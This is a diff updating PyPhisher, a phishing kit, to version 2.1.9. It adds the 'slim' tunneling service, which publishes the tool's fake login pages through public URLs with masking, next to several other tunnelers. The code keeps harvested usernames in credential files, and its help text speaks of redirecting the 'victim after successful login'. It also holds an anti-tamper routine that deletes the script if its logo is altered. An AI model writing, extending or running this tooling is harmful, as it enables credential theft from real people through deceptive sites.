@@ -1,9 +1,9 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : PyPhisher
 # Author     : KasRoudra
-# Version    : 2.1
+# Version    : 2.1.9
 # License    : MIT
-# Copyright  : KasRoudra (2021-2024)
+# Copyright  : KasRoudra (2021-2026)
 # Github     : https://github.com/KasRoudra
 # Gitlab     : https://gitlab.com/KasRoudra
 # Contact    : https://t.me/KasRoudra
@@ -78,6 +78,7 @@ from signal import (
 from subprocess import (
     DEVNULL,
     PIPE,
+    STDOUT,
     Popen,
     run
 )
@@ -110,7 +111,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="2.1.8"
+version="2.1.9"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -130,8 +131,8 @@ logo = rf"""
 {blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
-{cyan}        |___/  {" "*11}      {red}[By {logofooter}]
+{green}         __/ |{" "*17}       {cyan}[v{version}]
+{cyan}        |___/  {" "*11}      {red}[By {green}{logofooter}{red}]
 """
 
 
@@ -142,17 +143,25 @@ lx_help = f"""
 {blue}[3]{yellow} Login to your account
 {blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
 """
+
+slim_help = f"""
+Logging into slim allows the generation of slim url. You just have to use a google account to login
+"""
+
 shadow_help="""
 Shadow url is the url from which website previews are copied.
 When sending url through social media like facebook/telegram, 
 the previews are shown just below the url
 """
+
 redir_help="""
 Redirection url is the url which is used to redirect victim after successful login
 """
+
 curl_help="""
 Just a shortened url with your own masking
 """
+
 zip_help="""
 Add more templates from a zip file which will be downloaded from input url
 """
@@ -244,6 +253,7 @@ cf_file = f"{tunneler_dir}/cf.log"
 lx_file = f"{tunneler_dir}/loclx.log"
 lhr_file = f"{tunneler_dir}/lhr.log"
 svo_file = f"{tunneler_dir}/svo.log"
+slim_file = f"{tunneler_dir}/slim.log"
 site_dir = f"{home}/.site"
 cred_file = f"{site_dir}/usernames.txt"
 ip_file = f"{site_dir}/ip.txt"
@@ -263,10 +273,12 @@ default_tunneler = "Cloudflared"
 default_template = "60"
 cf_command = f"{tunneler_dir}/cloudflared"
 lx_command = f"{tunneler_dir}/loclx"
+slim_command = f"{tunneler_dir}/slim"
 if isdir("/data/data/com.termux/files/home"):
     termux = True
     cf_command = f"termux-chroot {cf_command}"
     lx_command = f"termux-chroot {lx_command}"
+    slim_command = f"termux-chroot {slim_command}"
     saved_file = "/sdcard/.creds.txt"
 else:
     termux = False
@@ -317,6 +329,7 @@ ts_commands = {
     "localxpose": f"{lx_command} tunnel http -t {local_url}",
     "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
     "serveo": f"ssh -R 80:{local_url} serveo.net -T -n",
+    "slim": f"{slim_command} share --port {port}",
     "cf": f"{cf_command} tunnel -url {local_url}",
     "loclx": f"{lx_command} tunnel http -t {local_url}",
     "lhr": f"ssh -R 80:{local_url} localhost.run -T -n",
@@ -413,7 +426,7 @@ def grep(regex, target):
 # Run shell commands in python
 def shell(command, capture_output=False):
     try:
-        return run(command, shell=True, capture_output=capture_output)
+        return run(command, shell=True, text=True, stderr=STDOUT if capture_output else None, stdout=PIPE if capture_output else None)
     except Exception as e:
         append(e, error_file)
     # return run(command.split(" "), shell=True)
@@ -426,7 +439,7 @@ def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
     except Exception as e:
         append(e, error_file)
         
-if sha256(logo.encode("utf-8")).hexdigest() != "931df196786d840c731d49fec1b43ab15edc7977f4e300bfb4c2e3657b9c591d":
+if sha256(logo.replace(version, "version").encode("utf-8")).hexdigest() != "addf9ed5610f8a2a3790e126d821e5eb7e3b2f9595fb6cdb0de4cee99bf2b7f2":
     print(f"{info}Visit: {repo_url}")
     bgtask(f"xdg-open {repo_url}")
     delete(__file__)
@@ -592,7 +605,7 @@ def killer():
     for process in processes:
         if kill and is_running(process):
             # system(f"killall {process}")
-            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
+            output = shell(f"pidof {process}", True).stdout.strip()
             if " " in output:
                 for pid in output.split(" "):
                     kill(int(pid), SIGINT)
@@ -778,6 +791,9 @@ def add_zip():
             remove("sites.zip")
             break
 
+def update_sites():
+    shell(f"git -C {sites_dir} pull origin main")
+
 # Polite Exit
 def pexit():
     killer()
@@ -788,15 +804,16 @@ def pexit():
 # Website chooser
 def show_options(sites):
     total_sites = len(sites)
-    def optioner(index, max_len):
-        # Avoid RangeError/IndexError
-        if index >= total_sites:
-            return ""
-        # Add 0 before single digit number
-        new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
+    def optioner(index, text, max_len):
         # To fullfill max length of a part we append empty space
-        space = " " * (max_len - len(sites[index]))
-        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
+        space = " " * (max_len - len(text))
+        if isinstance(index, (int, float)):
+            # Add 0 before single digit number
+            new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
+        else:
+            new_index = index
+        return f"{green}[{white}{new_index}{green}] {yellow}{text}{space}"
+
     # Array index starts from 0
     first_index = 0
     # Three columns
@@ -809,18 +826,25 @@ def show_options(sites):
     while first_index < one_third and total_sites > 10:
         second_index = first_index + one_third
         third_index = second_index + one_third
-        options += optioner(first_index, 23) + optioner(second_index, 17) + optioner(third_index, 1) + "\n"
+        options += optioner(first_index, sites[first_index], 23) 
+        options += optioner(second_index,  sites[second_index], 17) 
+        options += optioner(third_index,  sites[third_index], 1) 
+        options += "\n"
         first_index += 1
     if total_sites < 10:
         for i in range(total_sites):
             options += optioner(i, 20) + "\n"
     options += "\n"
-    if isfile(saved_file) and cat(saved_file)!="":
-        options += f"{green}[{white}a{green}]{yellow} About  {green}[{white}o{green}]{yellow} AddZip  {green}[{white}s{green}]{yellow} Saved   {green}[{white}x{green}]{yellow} More Tools  {green}[{white}0{green}]{yellow} Exit\n\n"
-        #options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} More Tools      {green}[{white}0{green}]{yellow} Exit\n\n"
-    else:
-        options += f"{green}[{white}a{green}]{yellow} About       {green}[{white}o{green}]{yellow} AddZip      {green}[{white}x{green}]{yellow} More Tools     {green}[{white}0{green}]{yellow} Exit\n\n"
-        #options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
+
+    options += optioner("o", "AddZip", 24)
+    options += optioner("s", "Saved", 18) if cat(saved_file) != "" else " " * 22
+    options += optioner("u", "Update Sites", 1)
+    options += "\n"
+
+    options += optioner("a", "About", 24)
+    options += optioner("m", "More Tools", 18)
+    options += optioner("0", "Exit", 1)
+    options += "\n"
     lolcat(options)
 
 
@@ -828,7 +852,7 @@ def show_options(sites):
 def lx_token():
     global lx_command
     while True:
-        status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
+        status = shell(f"{lx_command} account status", True).stdout.strip().lower()
         if not "error" in status:
             break
         has_token = input(f"\n{ask}Do you have loclx authtoken? [y/N/help]: {green}")
@@ -858,6 +882,30 @@ def ssh_key():
     if is_known2 != 0:
         shell(f"ssh-keyscan -H serveo.net >> {ssh_dir}/known_hosts", True)
 
+def slim_setup():
+    global slim_command
+    try: 
+        status = shell(f"{slim_command} domain list", True).stdout.strip().lower()
+        if "not logged in" in status:
+            is_slim = input(f"\n{ask}Do you have want to login in slim to get slim urls?[y/N/help] > {green}").lower()
+            if is_slim == "y":
+                status = shell(f"{slim_command} login", True).stdout.strip().lower()
+                if "logged in" in status:
+                    sprint(f"\n{success}Logged into slim successfully!")
+                else:
+                    sprint(f"\n{error}Failed to log in")
+                    append(status, error_file)
+            elif is_slim == "help":
+                sprint(slim_help, 0.01)
+                sleep(3)
+            elif is_slim in ["n", ""]:
+                pass
+            else:
+                print(f"\n{error}Invalid input '{is_slim}'!")
+                sleep(1)
+    except Exception as e:
+        append(e, error_file)
+
 
 # Output urls
 def url_manager(url, tunneler):
@@ -884,6 +932,7 @@ def kshrten(url):
         ".lhr.life": "lhr",
         ".lhr.pro": "lhro",
         ".serveo.net": "svo",
+        ".slim.show": "slim",
     }
     for key in route_map.keys():
         if key in url:
@@ -1127,7 +1176,7 @@ def updater():
 
 # Installing packages and downloading tunnelers
 def requirements():
-    global termux, cf_command, lx_command, is_mail_ok, email, password, receiver
+    global termux, cf_command, lx_command, slim_command, is_mail_ok, email, password, receiver
     # Termux may not have permission to write in saved_file.
     # So we check if /sdcard is readable.
     # If not execute termux-setup-storage to prompt user to allow
@@ -1167,12 +1216,15 @@ def requirements():
     architecture = osinfo.machine
     iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
     isloclx = isfile(f"{tunneler_dir}/loclx")
+    isslim = isfile(f"{tunneler_dir}/slim")
     delete("cloudflared.tgz", "cloudflared", "loclx.zip")
     internet()
     if "linux" in platform or "android" in platform:
         if "arm64" in architecture or "aarch64" in architecture:
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
+            if not isslim:
+                download("https://github.com/kamranahmedse/slim/releases/download/0.8.0/slim_0.8.0_linux_arm64.tar.gz", "slim.tgz")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
         elif "arm" in architecture:
@@ -1183,6 +1235,8 @@ def requirements():
         elif "x86_64" in architecture or "amd64" in architecture:
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
+            if not isslim:
+                download("https://github.com/kamranahmedse/slim/releases/download/0.8.0/slim_0.8.0_linux_amd64.tar.gz", "slim.tgz")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
         else:
@@ -1195,15 +1249,19 @@ def requirements():
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                 extract("cloudflared.tgz", f"{tunneler_dir}")
+            if not isslim:
+                download("https://github.com/kamranahmedse/slim/releases/download/0.8.0/slim_0.8.0_darwin_amd64.tar.gz", "slim.tgz")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
         elif "arm64" in architecture or "aarch64" in architecture:
             if not iscloudflared:
                 print(f"{error}Device architecture unknown. Download cloudflared manually!")
+            if not isslim:
+                download("https://github.com/kamranahmedse/slim/releases/download/0.8.0/slim_0.8.0_darwin_arm64.tar.gz", "slim.tgz")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
         else:
-            print(f"{error}Device architecture unknown. Download cloudflared/loclx manually!")
+            print(f"{error}Device architecture unknown. Download cloudflared/loclx/slim manually!")
             sleep(3)
     else:
         print(f"{error}Device not supported!")
@@ -1211,6 +1269,9 @@ def requirements():
     if isfile("loclx.zip"):
         extract("loclx.zip", f"{tunneler_dir}")
         remove("loclx.zip")
+    if isfile("slim.tgz"):
+        extract("slim.tgz", f"{tunneler_dir}")
+        remove("slim.tgz")
     for tunneler in tunnelers:
         if isfile(f"{tunneler_dir}/{tunneler}"):
             chmod(f"{tunneler_dir}/{tunneler}", 0o755)
@@ -1220,8 +1281,10 @@ def requirements():
             pexit()
     if is_installed("cloudflared"):
         cf_command = "cloudflared"
-    if is_installed("localxpose"):
-        lx_command = "localxpose"
+    if is_installed("loclx"):
+        lx_command = "loclx"
+    if is_installed("slim"):
+        slim_command = "slim"
     if isfile("websites.zip"):
         delete(sites_dir, recreate=True)
         print(f"\n{info}Copying website files....")
@@ -1249,6 +1312,7 @@ def requirements():
     if mode != "test":
         lx_token()
         ssh_key()
+        slim_setup()
     email_config = cat(email_file)
     if is_json(email_config):
         email_json = parse(email_config)
@@ -1317,6 +1381,8 @@ def main_menu():
             add_zip()
         elif choice.lower()=="s":
             saved()
+        elif choice.lower()=="u":
+            update_sites()
         elif choice.lower()=="m":
             bgtask("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
         elif choice == "0":
@@ -1351,7 +1417,7 @@ def server():
         sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
         sleep(2)
     sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
-    for logfile in [php_file, cf_file, lx_file, lhr_file, svo_file]:
+    for logfile in [php_file, cf_file, lx_file, slim_file, lhr_file, svo_file]:
         delete(logfile)
         if not isfile(logfile):
             try:
@@ -1364,6 +1430,7 @@ def server():
     lx_log = open(lx_file, "w")
     lhr_log = open(lhr_file, "w")
     svo_log = open(svo_file, "w")
+    slim_log = open(slim_file, "w")
     internet()
     bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
     sleep(2)
@@ -1393,6 +1460,7 @@ def server():
     else:
         bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
     bgtask(f"ssh -R 80:{local_url} serveo.net -T -n", stdout=svo_log, stderr=svo_log)
+    bgtask(f"{slim_command} share --port {port} {arguments}", stdout=slim_log, stderr=slim_log)
     sleep(10)
     cf_success = False
     for _ in range(10):
@@ -1422,16 +1490,25 @@ def server():
             svo_success = True
             break
         sleep(1)
-    if cf_success or lx_success or lhr_success or svo_success:
+    slim_success = False
+    for _ in range(10):
+        slim_url = grep("(https://[-0-9a-z.]*.slim.show)", slim_file)
+        if slim_url != "":
+            slim_success = True
+            break
+        sleep(1)
+    if cf_success or lx_success or lhr_success or svo_success or slim_success:
         sprint(f"\n{info}Your urls are given below:\n")
         if mode == "test":
             print(f"\n{info}URL generation has completed successfully!")
-            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}")
+            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}, Slim: {slim_success}")
             pexit()
         if cf_success:
             url_manager(cf_url, "CloudFlared")
         if lx_success:
             url_manager(lx_url, "LocalXpose")
+        if slim_success:
+            url_manager(slim_url, "Slim")
         if lhr_success:
             url_manager(lhr_url, "LocalHostRun")
         if svo_success:
@@ -1442,8 +1519,10 @@ def server():
             masking(lhr_url)
         elif cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
             masking(cf_url)
+        elif slim_success and tunneler.lower() in [ "slim", "slm" ]:
+            masking(slim_url)
         elif svo_success and tunneler.lower() in [ "serveo", "svo" ]:
-            masking(cf_url)
+            masking(svo_url)
         else:
             print(f"\n{error}URL masking isn't available for {tunneler}!{nc}")
     else:
